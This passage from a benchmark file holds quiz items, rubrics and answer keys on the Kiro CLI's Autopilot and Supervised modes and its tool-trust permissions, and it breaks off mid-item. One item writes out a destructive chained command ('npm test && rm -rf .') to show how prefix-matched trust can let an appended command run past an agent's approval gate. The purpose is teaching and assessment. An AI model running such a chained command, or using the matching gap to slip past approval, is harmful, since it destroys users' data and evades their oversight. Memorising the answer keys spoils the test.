@@ -1,0 +1,2722 @@
+# Topic: kiro-cli-autopilot-and-trust (kiro-cli)
+# Autopilot vs supervised execution and the trust/permission model for tool execution in the Kiro CLI.
+# 100 items, 20/tier (100-500). Authored + adversarially reviewed for correctness, recency, calibration, dedup.
+
+id: kiro-cli-autopilot-and-trust
+class:
+  kind: tool
+  tool: kiro-cli
+title: Kiro CLI Autopilot & Trust
+summary: >-
+  Autopilot vs supervised execution and the trust/permission model for tool execution in the Kiro
+  CLI.
+triggerSignals: []
+items:
+  - id: kat-100-ff-a
+    tier: 100
+    bloom: remember
+    difficulty: 130
+    type: free_form
+    prompt: Name the three documented safeguards a user still has while Kiro is running in Autopilot mode.
+    rubric:
+      criteria:
+        - id: c1
+          text: Mentions viewing all changes (diff view of modifications)
+        - id: c2
+          text: Mentions reverting all changes (restore files to previous state)
+        - id: c3
+          text: Mentions interrupting execution mid-run to regain manual control
+      referenceAnswer: >-
+        Even in Autopilot you can View all changes in a diff view, Revert all changes to restore
+        files to their previous state on disk, and interrupt Autopilot mid-execution to regain
+        manual control.
+      passThreshold: 0.6
+    guidance: >-
+      Autopilot autonomy does not remove oversight: view-diff, revert, and interrupt are the three
+      documented controls. They let an autonomous run remain reviewable and stoppable.
+  - id: kat-100-ff-b
+    tier: 100
+    bloom: remember
+    difficulty: 146
+    type: free_form
+    prompt: Name the three documented subcommands of the Kiro CLI /tools command and what each does.
+    rubric:
+      criteria:
+        - id: c1
+          text: trust pre-approves a named tool so it runs without prompting
+        - id: c2
+          text: untrust requires explicit permission for a tool again (reverts to per-request)
+        - id: c3
+          text: reset clears all runtime permissions back to defaults
+      referenceAnswer: >-
+        /tools trust <name> pre-approves a specific tool so it runs without prompting; /tools
+        untrust <name> requires explicit permission for that tool again; and /tools reset clears all
+        runtime permissions, returning to defaults.
+      passThreshold: 0.6
+    guidance: >-
+      The documented /tools subcommands are trust, untrust, and reset. They manage which tools run
+      without a per-use confirmation during the session.
+  - id: kat-100-ff-c
+    tier: 100
+    bloom: remember
+    difficulty: 154
+    type: free_form
+    prompt: >-
+      Kiro's built-in tools have internal names used in agent config and hook matchers. Name the
+      internal tool names for reading files, writing files, running shell commands, and calling the
+      AWS CLI.
+    rubric:
+      criteria:
+        - id: c1
+          text: fs_read for reading files and fs_write for writing/modifying files
+        - id: c2
+          text: execute_bash for running shell commands
+        - id: c3
+          text: use_aws for AWS CLI calls
+      referenceAnswer: >-
+        The internal tool names are fs_read (read files), fs_write (create/modify files),
+        execute_bash (run shell commands), and use_aws (call the AWS CLI). Simplified aliases like
+        read and shell also map to these.
+      passThreshold: 0.6
+    guidance: >-
+      Kiro's built-in tools use internal names fs_read, fs_write, execute_bash, and use_aws (with
+      simplified aliases such as read and shell). Hook matchers and agent config reference the
+      internal names.
+  - id: kat-100-ff-d
+    tier: 100
+    bloom: remember
+    difficulty: 162
+    type: free_form
+    prompt: >-
+      When Kiro CLI shows a tool-approval prompt, what do pressing y, pressing n, and pressing Tab
+      each do?
+    rubric:
+      criteria:
+        - id: c1
+          text: y approves the current tool call
+        - id: c2
+          text: n rejects the current tool call
+        - id: c3
+          text: Tab drills into options (e.g. to trust a pattern or provide feedback)
+      referenceAnswer: >-
+        At the approval prompt, press y to approve the action, n to reject it, or Tab to drill into
+        options (such as trusting a command pattern so routine operations stop interrupting you, or
+        providing feedback).
+      passThreshold: 0.6
+    guidance: >-
+      The documented approval prompt is y (approve), n (reject), Tab (drill into options). Tab is
+      how you escalate from a one-time approval to trusting a recurring pattern.
+  - id: kat-100-ff-e
+    tier: 100
+    bloom: remember
+    difficulty: 168
+    type: free_form
+    prompt: >-
+      Kiro decides whether to auto-run a shell command using its Trusted Commands setting with
+      simple string prefix matching. Name the three kinds of trust patterns it supports.
+    rubric:
+      criteria:
+        - id: c1
+          text: Exact match (a specific command string)
+        - id: c2
+          text: Wildcard/prefix match (a prefix plus a wildcard, e.g. all npm run commands)
+        - id: c3
+          text: Universal trust (trust everything)
+      referenceAnswer: >-
+        Trusted Commands supports exact matching (a specific command), wildcard/prefix matching (a
+        prefix with a wildcard, such as trusting all npm run commands), and universal trust (trust
+        every command). It uses simple string prefix matching and does not analyze command structure
+        or chaining.
+      passThreshold: 0.6
+    guidance: >-
+      The three documented forms are exact, wildcard/prefix, and universal trust, configured via the
+      Kiro Agent: Trusted Commands setting. Matching is prefix-based, not a parse of the command.
+  - id: kat-100-ff-f
+    tier: 100
+    bloom: remember
+    difficulty: 164
+    type: free_form
+    prompt: >-
+      Kiro hardcodes a set of protected paths that always require your approval before they are
+      touched, even when other commands are trusted. Name three of these protected path patterns.
+    rubric:
+      criteria:
+        - id: c1
+          text: Names .git/ (or .git) and/or .vscode/
+        - id: c2
+          text: Names mcp.json
+        - id: c3
+          text: Names .kiroignore and/or .code-workspace
+      referenceAnswer: >-
+        Protected paths that always require approval include .vscode/ (and vscode~), .git/ (and
+        git~, .git), .code-workspace files, mcp.json, and .kiroignore. These trigger a confirmation
+        regardless of trusted-command settings.
+      passThreshold: 0.6
+    guidance: >-
+      The documented protected paths are .vscode/, .git/, .code-workspace, mcp.json, and
+      .kiroignore. They are behavior- or environment-affecting, so edits to them always prompt.
+  - id: kat-100-mc-a
+    tier: 100
+    bloom: remember
+    difficulty: 122
+    type: multiple_choice
+    prompt: In Kiro's chat interface, which execution mode is the DEFAULT?
+    choices:
+      - id: a
+        text: Autopilot mode
+      - id: b
+        text: Supervised mode
+      - id: c
+        text: Read-only mode
+      - id: d
+        text: Manual mode
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Autopilot is the default. In Autopilot, Kiro works autonomously to complete tasks end-to-end
+      without asking for approval at each step. Supervised mode is opt-in for situations requiring
+      careful review.
+  - id: kat-100-mc-b
+    tier: 100
+    bloom: remember
+    difficulty: 128
+    type: multiple_choice
+    prompt: Which Kiro CLI slash command manages tool permissions for the session?
+    choices:
+      - id: a
+        text: /trust
+      - id: b
+        text: /tools
+      - id: c
+        text: /permissions
+      - id: d
+        text: /allow
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      The verified command is /tools, with subcommands trust, untrust, and reset. There is no /trust
+      or /allow command; /permissions is not the documented session command.
+  - id: kat-100-mc-c
+    tier: 100
+    bloom: remember
+    difficulty: 124
+    type: multiple_choice
+    prompt: What are the two permission states a Kiro CLI tool can be in?
+    choices:
+      - id: a
+        text: Allowed and Blocked
+      - id: b
+        text: Public and Private
+      - id: c
+        text: Trusted and Per-request
+      - id: d
+        text: Auto and Manual
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      A tool is either Trusted (runs without a per-use prompt) or Per-request (confirm each time it
+      is used). These are the two documented states managed via /tools.
+  - id: kat-100-mc-d
+    tier: 100
+    bloom: remember
+    difficulty: 132
+    type: multiple_choice
+    prompt: In Autopilot mode, which capability is described as a way to undo modifications?
+    choices:
+      - id: a
+        text: Reset Permissions
+      - id: b
+        text: Untrust Tool
+      - id: c
+        text: Clear Context
+      - id: d
+        text: Revert All Changes
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      Autopilot still offers Revert All Changes, which restores files to their previous state on
+      disk. View all changes (diff) and interrupt mid-execution are the other documented safeguards.
+  - id: kat-100-mc-e
+    tier: 100
+    bloom: remember
+    difficulty: 136
+    type: multiple_choice
+    prompt: >-
+      Which built-in Kiro tool is the lowest-risk to allowlist (let run without prompting), because
+      it cannot modify files or system state?
+    choices:
+      - id: a
+        text: read (fs_read)
+      - id: b
+        text: write (fs_write)
+      - id: c
+        text: shell (execute_bash)
+      - id: d
+        text: aws (use_aws)
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Reading files (fs_read) is non-mutating, so it is the lowest-risk tool to add to allowedTools.
+      By default Kiro requires approval before running commands; write, shell, and aws change state
+      and warrant tighter gating.
+  - id: kat-100-mc-f
+    tier: 100
+    bloom: remember
+    difficulty: 140
+    type: multiple_choice
+    prompt: Which subcommand of /tools reverts a tool back to per-request confirmation?
+    choices:
+      - id: a
+        text: revoke
+      - id: b
+        text: untrust
+      - id: c
+        text: deny
+      - id: d
+        text: block
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      /tools untrust reverts a tool to per-request confirmation. The documented subcommands are
+      trust, untrust, and reset; there is no revoke/deny/block.
+  - id: kat-100-mc-g
+    tier: 100
+    bloom: remember
+    difficulty: 144
+    type: multiple_choice
+    prompt: >-
+      At a Kiro CLI tool-approval prompt, which key drills into more options (such as trusting a
+      command pattern or giving feedback) rather than just approving or rejecting once?
+    choices:
+      - id: a
+        text: Enter
+      - id: b
+        text: Tab
+      - id: c
+        text: Space
+      - id: d
+        text: Esc
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      The prompt is y to approve, n to reject, and Tab to drill into options. Tab is how you
+      escalate a one-time approval into a trusted pattern or provide feedback.
+  - id: kat-100-mc-h
+    tier: 100
+    bloom: remember
+    difficulty: 148
+    type: multiple_choice
+    prompt: >-
+      In Kiro's headless (non-interactive) mode, which flag grants specific tool categories upfront
+      so only those run without prompting?
+    choices:
+      - id: a
+        text: '--allow-list'
+      - id: b
+        text: '--permit'
+      - id: c
+        text: '--trust-tools=<categories>'
+      - id: d
+        text: '--auto-yes'
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      In headless mode there is no human to approve, so you grant permissions upfront:
+      --trust-tools=<categories> (e.g. read, write) for least privilege, or --trust-all-tools for
+      everything.
+  - id: kat-100-mc-i
+    tier: 100
+    bloom: remember
+    difficulty: 138
+    type: multiple_choice
+    prompt: Which headless-mode flag auto-approves every tool call without prompting?
+    choices:
+      - id: a
+        text: '--trust-all-tools'
+      - id: b
+        text: '--no-confirm'
+      - id: c
+        text: '--yolo'
+      - id: d
+        text: '--accept-all'
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      --trust-all-tools auto-approves all tool calls in headless/CI runs. For least privilege,
+      prefer --trust-tools=<categories> to grant only the categories you need.
+  - id: kat-100-mc-j
+    tier: 100
+    bloom: remember
+    difficulty: 152
+    type: multiple_choice
+    prompt: >-
+      In a Kiro custom-agent config, which field lists the tools that may run WITHOUT prompting the
+      user?
+    choices:
+      - id: a
+        text: trustedTools
+      - id: b
+        text: autoRun
+      - id: c
+        text: allowedTools
+      - id: d
+        text: permits
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      allowedTools lists tools usable without prompting. The related fields are tools (which tools
+      are available at all), toolAliases (rename tools), and toolsSettings (per-tool configuration).
+  - id: kat-100-mc-k
+    tier: 100
+    bloom: remember
+    difficulty: 156
+    type: multiple_choice
+    prompt: >-
+      Which internal Kiro tool name (used in hook matchers and agent config) corresponds to running
+      shell commands?
+    choices:
+      - id: a
+        text: run_command
+      - id: b
+        text: shell_exec
+      - id: c
+        text: execute_bash
+      - id: d
+        text: terminal
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      The internal tool name for running shell commands is execute_bash (its simplified alias is
+      shell). Other internal names are fs_read, fs_write, and use_aws.
+  - id: kat-100-mc-l
+    tier: 100
+    bloom: remember
+    difficulty: 160
+    type: multiple_choice
+    prompt: Which /tools subcommand restores all runtime permissions to their defaults?
+    choices:
+      - id: a
+        text: clear
+      - id: b
+        text: untrust-all
+      - id: c
+        text: default
+      - id: d
+        text: reset
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      /tools reset clears all runtime permissions back to defaults for the session. The documented
+      subcommands are trust, untrust, and reset.
+  - id: kat-100-mc-m
+    tier: 100
+    bloom: remember
+    difficulty: 134
+    type: multiple_choice
+    prompt: In Supervised mode, after which kind of turn does Kiro yield for your approval?
+    choices:
+      - id: a
+        text: Any turn that contains file edits
+      - id: b
+        text: Only turns that run shell commands
+      - id: c
+        text: Every turn, including pure text replies
+      - id: d
+        text: Only the final turn of a task
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Supervised mode yields for approval after each turn that contains file edits, showing changes
+      as individual hunks. Pure conversational turns without edits do not pause for approval.
+  - id: kat-100-mc-n
+    tier: 100
+    bloom: remember
+    difficulty: 142
+    type: multiple_choice
+    prompt: How does a user configure which shell commands Kiro may run without prompting?
+    choices:
+      - id: a
+        text: 'By editing the "Kiro Agent: Trusted Commands" setting'
+      - id: b
+        text: By committing a trust file to the repository root
+      - id: c
+        text: By setting the KIRO_TRUST environment variable
+      - id: d
+        text: Trusted commands cannot be configured; only prompted per use
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Trusted commands are configured in the "Kiro Agent: Trusted Commands" setting (searchable in
+      settings). Within a session you can also use /tools trust. Trust is a local user decision, not
+      something a repo ships.
+  - id: kat-200-ff-a
+    tier: 200
+    bloom: understand
+    difficulty: 230
+    type: free_form
+    prompt: >-
+      Explain what the headless flag --trust-all-tools does and why --trust-tools=<categories> is
+      the safer choice for a CI run.
+    rubric:
+      criteria:
+        - id: c1
+          text: States --trust-all-tools auto-approves every tool call with no prompting
+        - id: c2
+          text: >-
+            Identifies the risk - destructive actions (write, shell, aws) then run with no
+            confirmation
+        - id: c3
+          text: >-
+            Notes --trust-tools grants only named categories (least privilege), bounding blast
+            radius
+      referenceAnswer: >-
+        --trust-all-tools auto-approves every tool call, so in a non-interactive run Kiro stops
+        asking before any action - including destructive write, shell, or aws calls - which means
+        one bad inference can do real damage. --trust-tools=<categories> instead grants only the
+        named categories (e.g. read, write), following least privilege so the job can only do what
+        it actually needs.
+      passThreshold: 0.6
+    guidance: >-
+      Blanket trust removes the human gate entirely. In CI there is no human to approve, so grant
+      the narrowest set of categories the job requires rather than trusting everything.
+  - id: kat-200-ff-b
+    tier: 200
+    bloom: understand
+    difficulty: 242
+    type: free_form
+    prompt: >-
+      Compare Autopilot and Supervised mode in terms of when each is appropriate, and what control
+      you trade away when you choose Autopilot.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Describes Autopilot as autonomous end-to-end execution suited to well-defined repetitive
+            tasks
+        - id: c2
+          text: >-
+            Describes Supervised as pausing after edit-containing turns for per-hunk review, suited
+            to critical/new code
+        - id: c3
+          text: Identifies the traded control - per-step/per-edit approval is given up in Autopilot
+      referenceAnswer: >-
+        Autopilot runs tasks end-to-end without per-step approval and fits repetitive, well-defined,
+        multi-file work. Supervised yields after each edit-containing turn so you accept/reject
+        hunks, fitting critical codebases or new users. Choosing Autopilot trades away the per-edit
+        approval gate, relying instead on after-the-fact diff review, revert, and interrupt.
+      passThreshold: 0.6
+    guidance: >-
+      The contrast is review cadence. Autopilot moves the human checkpoint from before each edit to
+      after the run (diff/revert), which is faster but lets more change happen before you look.
+  - id: kat-200-ff-c
+    tier: 200
+    bloom: understand
+    difficulty: 254
+    type: free_form
+    prompt: >-
+      Even if a user trusts broad command patterns, Kiro still prompts before touching certain
+      protected paths. Explain how this combination delivers broad productivity while keeping hard
+      fences around sensitive files.
+    rubric:
+      criteria:
+        - id: c1
+          text: Explains trusted command patterns let most routine operations run without prompts
+        - id: c2
+          text: >-
+            Explains the protected paths (.git, .vscode, mcp.json, .kiroignore) always force
+            approval regardless of trust
+        - id: c3
+          text: >-
+            Concludes the result is permissive-by-default with non-overridable fences on the risky
+            files
+      referenceAnswer: >-
+        A user can trust broad patterns (e.g. all npm run commands) so routine work runs without
+        interruption. But Kiro hardcodes a set of protected paths - .git/, .vscode/,
+        .code-workspace, mcp.json, .kiroignore - that always require approval no matter what is
+        trusted. So you get broad productivity for normal operations while edits to environment- or
+        behavior-defining files still force a confirmation. The fence is not something a trust
+        setting can re-open.
+      passThreshold: 0.6
+    guidance: >-
+      Broad trust handles the common case; the hardcoded protected paths are an always-ask floor
+      that trust cannot override, giving permissive-by-default with fixed fences on the sensitive
+      files.
+  - id: kat-200-ff-d
+    tier: 200
+    bloom: understand
+    difficulty: 266
+    type: free_form
+    prompt: >-
+      Why is it lower-risk to allowlist file READS broadly than file WRITES, even though both skip
+      prompts once trusted?
+    rubric:
+      criteria:
+        - id: c1
+          text: States reads are non-mutating (exposure/confidentiality risk only)
+        - id: c2
+          text: >-
+            States writes mutate state, so trusting them risks integrity/destruction (a larger blast
+            radius)
+        - id: c3
+          text: Concludes you can allow fs_read more freely but should keep fs_write narrowly scoped
+      referenceAnswer: >-
+        Trusting fs_read only trades away confidentiality control - the agent can read more files,
+        but it cannot change anything. Trusting fs_write trades away integrity control - the agent
+        can overwrite or destroy state, a much larger and irreversible blast radius. So a broad read
+        allowlist is comparatively safe, whereas writes should stay narrowly scoped (to the
+        directories you actually edit) and gated.
+      passThreshold: 0.6
+    guidance: >-
+      Non-mutating vs mutating is the key axis. Reads risk exposure; writes risk destruction. Match
+      trust breadth to that asymmetry: allow reads more freely, keep writes scoped.
+  - id: kat-200-ff-e
+    tier: 200
+    bloom: understand
+    difficulty: 238
+    type: free_form
+    prompt: >-
+      Explain why Kiro's MODE (Autopilot vs Supervised) and its command-TRUST system are two
+      independent things, and why Supervised mode is explicitly NOT a security control.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            States mode controls the review cadence (Supervised pauses after edit-containing turns;
+            Autopilot runs end-to-end)
+        - id: c2
+          text: >-
+            States trust controls whether a given command runs without a per-use prompt, governed by
+            the trusted-commands policy in both modes
+        - id: c3
+          text: >-
+            Notes Supervised is a code-review workflow, not a sandbox or access-control boundary, so
+            trusted commands can still run
+      referenceAnswer: >-
+        Mode sets when Kiro pauses for human review of edits (Supervised yields after each turn
+        containing file edits; Autopilot runs end-to-end). Trust sets whether a command runs without
+        a per-use prompt, and both modes use the same trusted-commands policy. They are orthogonal.
+        Critically, Supervised mode is documented as a code-review workflow, not a security control
+        - it is not a sandbox or access boundary - so a trusted shell command can still execute even
+        in Supervised mode; only the edit-review gate differs.
+      passThreshold: 0.6
+    guidance: >-
+      Mode = edit-review cadence; trust = whether a command prompts. Supervised is review, not
+      security: it does not block trusted commands. Use the trust/permission system, not mode, to
+      gate what can run.
+  - id: kat-200-ff-f
+    tier: 200
+    bloom: understand
+    difficulty: 220
+    type: free_form
+    prompt: >-
+      Why is it a deliberate safety property that Kiro's trusted-commands configuration is a local
+      user setting rather than something a repository carries with it?
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Explains trust is a local, per-user decision (e.g. the Trusted Commands setting),
+            established on the machine
+        - id: c2
+          text: >-
+            Explains a cloned repo cannot carry trust, so it cannot pre-authorize the agent on your
+            machine
+        - id: c3
+          text: >-
+            Concludes this prevents a hostile or unfamiliar repo from injecting trust while still
+            letting each user decide
+      referenceAnswer: >-
+        Trust is a local user decision - configured in your own Trusted Commands setting / via
+        /tools during the session - and lives with you, not in the project. Because a cloned
+        repository cannot carry trust, nothing a repo ships can pre-authorize the agent to run
+        commands on your machine. The trade is that trust does not travel with the code, which is
+        exactly what stops a hostile or unfamiliar repo from silently granting the agent extra
+        power; each user establishes trust deliberately.
+      passThreshold: 0.6
+    guidance: >-
+      Keeping trust as a local user setting rather than a repo artifact means cloning a repo never
+      grants the agent power. The safety property is anti-injection; the cost is trust does not
+      auto-share across a team.
+  - id: kat-200-mc-a
+    tier: 200
+    bloom: understand
+    difficulty: 224
+    type: multiple_choice
+    prompt: Why does choosing Supervised mode change the workflow compared to Autopilot?
+    choices:
+      - id: a
+        text: >-
+          It makes Kiro pause for human approval after each turn that contains file edits, showing
+          per-hunk diffs
+      - id: b
+        text: It disables all tool use until you re-enable it manually
+      - id: c
+        text: It switches Kiro to a faster but less capable model
+      - id: d
+        text: It permanently trusts all tools so nothing prompts again
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Supervised inserts a human checkpoint after edit-containing turns so you can accept/reject
+      hunks. It is about review cadence, not model choice or trust persistence.
+  - id: kat-200-mc-b
+    tier: 200
+    bloom: understand
+    difficulty: 232
+    type: multiple_choice
+    prompt: >-
+      A command falls under a broadly trusted pattern but also targets one of Kiro's protected paths
+      (like .git/). What happens?
+    choices:
+      - id: a
+        text: The broad trust wins and the action runs silently
+      - id: b
+        text: It errors because two rules conflict
+      - id: c
+        text: >-
+          Kiro still prompts for approval, because protected paths require confirmation regardless
+          of trust
+      - id: d
+        text: The action is permanently blocked
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      Protected paths (.git/, .vscode/, mcp.json, .kiroignore, .code-workspace) always require
+      approval. A broad trust setting cannot override that floor, so the more restrictive outcome
+      (prompt) wins.
+  - id: kat-200-mc-c
+    tier: 200
+    bloom: understand
+    difficulty: 236
+    type: multiple_choice
+    prompt: >-
+      Why is it deliberate that Kiro's command trust is a local user setting rather than something
+      carried inside a repository?
+    choices:
+      - id: a
+        text: Because YAML files cannot be committed to git
+      - id: b
+        text: To keep the repo smaller
+      - id: c
+        text: >-
+          So a cloned or untrusted repo cannot carry trust that silently pre-authorizes the agent on
+          your machine
+      - id: d
+        text: Because trust rules are temporary and reset on every clone
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      Trust is a per-user, machine-local decision. Because a cloned repo cannot carry trust, a
+      hostile or unfamiliar repo cannot inject permissions; each user establishes trust
+      deliberately.
+  - id: kat-200-mc-d
+    tier: 200
+    bloom: understand
+    difficulty: 240
+    type: multiple_choice
+    prompt: >-
+      Why is allowlisting the read (fs_read) tool a smaller safety concession than allowlisting
+      write or shell?
+    choices:
+      - id: a
+        text: Because read can only ever see one file at a time
+      - id: b
+        text: Because reads are logged and writes are not
+      - id: c
+        text: Because read silently asks every time anyway
+      - id: d
+        text: >-
+          Reading files is low-risk and non-destructive, unlike writing or running commands which
+          mutate state
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      fs_read is non-mutating, so allowing it trades away only confidentiality, not integrity.
+      Mutating tools (write, shell, aws) should stay gated because they can change or destroy state.
+  - id: kat-200-mc-e
+    tier: 200
+    bloom: understand
+    difficulty: 244
+    type: multiple_choice
+    prompt: >-
+      Kiro's trusted-command matching uses simple string prefix matching and does NOT analyze
+      command structure, chains, or special characters. What risk does this create when you trust a
+      prefix?
+    choices:
+      - id: a
+        text: >-
+          A chained command like "npm test && rm -rf ." can match a trusted "npm test" prefix and
+          run, because the chain is not parsed apart
+      - id: b
+        text: Trusted commands never run at all
+      - id: c
+        text: Each chained sub-command is sandboxed separately
+      - id: d
+        text: The prefix is recompiled into a strict regex that blocks chaining
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Because matching is prefix-based and does not split on ; && || |, a trusted prefix can
+      inadvertently cover an appended dangerous command. Keep trusted patterns specific, and do not
+      assume Kiro will isolate the safe half of a chain.
+  - id: kat-200-mc-f
+    tier: 200
+    bloom: understand
+    difficulty: 248
+    type: multiple_choice
+    prompt: >-
+      Using wildcard trust patterns, how does trusting "git pull" (with a wildcard suffix) differ
+      from trusting "git" (with a wildcard suffix)?
+    choices:
+      - id: a
+        text: They are identical; the wildcard means the same thing in both
+      - id: b
+        text: >-
+          "git pull *" trusts only the pull subcommand with any args; "git *" trusts every git
+          subcommand
+      - id: c
+        text: '"git pull *" trusts all git commands and "git *" trusts only pull'
+      - id: d
+        text: '"git *" is more restrictive than "git pull *"'
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      Prefix matching means "git pull *" only covers strings starting with "git pull", while "git *"
+      covers anything starting with "git" - every subcommand, including push or reset. The broader
+      prefix is less restrictive.
+  - id: kat-200-mc-g
+    tier: 200
+    bloom: understand
+    difficulty: 252
+    type: multiple_choice
+    prompt: >-
+      Why does Kiro hardcode mcp.json as a protected path that always requires approval before it is
+      modified?
+    choices:
+      - id: a
+        text: Because mcp.json is read-only on disk
+      - id: b
+        text: To prevent users from editing it manually
+      - id: c
+        text: >-
+          Because mcp.json configures which MCP servers/tools are available, so an unconfirmed edit
+          could expand the agent's own tool surface
+      - id: d
+        text: Because mcp.json is stored in a database, not a file
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      mcp.json defines the MCP servers and tools the agent can use. Forcing approval before it
+      changes stops the agent from silently adding to its own capabilities. It is one of the
+      hardcoded protected paths alongside .git/, .vscode/, .code-workspace, and .kiroignore.
+  - id: kat-200-mc-h
+    tier: 200
+    bloom: understand
+    difficulty: 256
+    type: multiple_choice
+    prompt: Why does Kiro require approval before touching .git/ (rather than blocking it outright)?
+    choices:
+      - id: a
+        text: Because blocking is not supported for directories
+      - id: b
+        text: Because asking is faster than blocking
+      - id: c
+        text: Because .git is never actually written by the agent
+      - id: d
+        text: >-
+          Git internals are sensitive but legitimately edited (commits, config), so Kiro requires
+          explicit confirmation rather than blocking outright
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      .git/ is a protected path: changes to history or git config are high-impact but legitimate, so
+      an always-ask gate balances safety with the need to do real git work. A hard block would
+      prevent normal use.
+  - id: kat-200-mc-i
+    tier: 200
+    bloom: understand
+    difficulty: 228
+    type: multiple_choice
+    prompt: >-
+      In a Kiro MCP server entry, what does setting "disabled": true do, and how does it relate to
+      limiting the agent's tool surface?
+    choices:
+      - id: a
+        text: >-
+          It turns the entire server off so none of its tools are available - the bluntest way to
+          remove an MCP tool surface
+      - id: b
+        text: It trusts all of that server's tools
+      - id: c
+        text: It forces every tool on that server to prompt twice
+      - id: d
+        text: It deletes the server config file
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      The documented server-level control is "disabled": true, which makes the whole server
+      unavailable. To let specific tools run without prompting, list them in the agent config's
+      allowedTools rather than at the MCP server level.
+  - id: kat-200-mc-j
+    tier: 200
+    bloom: understand
+    difficulty: 260
+    type: multiple_choice
+    prompt: >-
+      Why might a team prefer Autopilot for repetitive multi-file refactors but Supervised for a
+      critical codebase?
+    choices:
+      - id: a
+        text: Autopilot cannot edit multiple files, so critical work needs Supervised
+      - id: b
+        text: >-
+          Autopilot trades per-step review for speed on well-defined work; Supervised trades speed
+          for per-hunk review where mistakes are costly
+      - id: c
+        text: Supervised uses a more powerful model for critical code
+      - id: d
+        text: Autopilot disables reverts, so it is unsafe for any real work
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      The mode choice is a risk/velocity tradeoff. Predictable bulk edits benefit from autonomy;
+      high-blast- radius changes benefit from a human gate on each edit.
+  - id: kat-200-mc-k
+    tier: 200
+    bloom: understand
+    difficulty: 264
+    type: multiple_choice
+    prompt: What is the practical effect of choosing universal trust (a bare wildcard) for shell commands?
+    choices:
+      - id: a
+        text: Only previously seen commands are trusted
+      - id: b
+        text: Shell is disabled entirely
+      - id: c
+        text: Every shell command runs without prompts, the broadest and riskiest trust choice
+      - id: d
+        text: Only commands inside the working directory are trusted
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      Universal trust authorizes all shell commands with no prompting - the least restrictive
+      option, with the same risk profile as trusting everything. Prefer specific exact or prefix
+      patterns instead.
+  - id: kat-200-mc-l
+    tier: 200
+    bloom: understand
+    difficulty: 268
+    type: multiple_choice
+    prompt: >-
+      How does a trusted-command pattern set in the "Kiro Agent: Trusted Commands" setting differ in
+      lifetime from one granted via /tools trust during a chat?
+    choices:
+      - id: a
+        text: Both are forgotten when the terminal closes
+      - id: b
+        text: >-
+          The Trusted Commands setting persists across sessions, while a /tools trust grant is
+          runtime state cleared by /tools reset or a new session
+      - id: c
+        text: Both are stored in the repository and shared with teammates
+      - id: d
+        text: The setting is session-only and /tools trust is permanent
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      The Trusted Commands setting is persistent user configuration; /tools trust is session-scoped
+      runtime trust that /tools reset clears. Use the setting for durable patterns, /tools for
+      one-off session convenience.
+  - id: kat-200-mc-m
+    tier: 200
+    bloom: understand
+    difficulty: 272
+    type: multiple_choice
+    prompt: >-
+      Kiro exposes both simplified tool names (read, shell) and internal names (fs_read,
+      execute_bash). In which context must you use the INTERNAL names?
+    choices:
+      - id: a
+        text: >-
+          In hook matchers, which match on internal tool names (fs_read, fs_write, execute_bash,
+          use_aws), not the simplified ones
+      - id: b
+        text: Only in the chat prompt, never in config
+      - id: c
+        text: The internal names are deprecated and never used
+      - id: d
+        text: Internal names only work for MCP tools
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Hook matchers use the internal tool names (fs_read, fs_write, execute_bash, use_aws) rather
+      than the simplified aliases (read, shell). Using the wrong form means the matcher will not
+      fire.
+  - id: kat-200-mc-n
+    tier: 200
+    bloom: understand
+    difficulty: 276
+    type: multiple_choice
+    prompt: In headless mode, how do --trust-all-tools and --trust-tools=<categories> differ in scope?
+    choices:
+      - id: a
+        text: They are identical aliases
+      - id: b
+        text: >-
+          --trust-all-tools approves every tool; --trust-tools approves only the named categories
+          (least privilege)
+      - id: c
+        text: '--trust-tools approves everything; --trust-all-tools approves only reads'
+      - id: d
+        text: Both only apply to MCP tools
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      --trust-all-tools is the broad grant (every tool); --trust-tools=<categories> narrows it to
+      specific categories like read or write. Prefer --trust-tools in CI to bound blast radius.
+  - id: kat-300-ff-a
+    tier: 300
+    bloom: apply
+    difficulty: 338
+    type: free_form
+    prompt: >-
+      Describe a least-privilege trust posture (using allowedTools and trusted command patterns)
+      that lets Kiro read files freely and run your build/test commands without prompting, but still
+      confirms before any git push. Explain how you avoid over-trusting.
+    rubric:
+      criteria:
+        - id: c1
+          text: Allowlist the read tool (fs_read) so reads do not prompt
+        - id: c2
+          text: >-
+            Trust specific safe command prefixes (e.g. npm test, npm run build) rather than a bare
+            git or universal wildcard
+        - id: c3
+          text: >-
